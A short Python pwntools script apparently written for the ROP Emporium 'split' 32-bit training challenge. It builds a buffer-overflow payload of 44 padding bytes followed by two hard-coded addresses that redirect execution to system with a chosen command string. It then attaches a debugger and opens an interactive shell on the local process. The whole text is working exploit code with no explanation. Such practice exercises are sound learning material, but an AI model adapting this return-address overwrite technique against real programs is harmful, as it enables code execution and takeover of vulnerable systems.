from pwn import *

p = process("./split32")

pay = b"a"*44 + p32(0x804861a) + p32(0x804a030)

gdb.attach(p)

p.sendline(pay)

p.interactive()
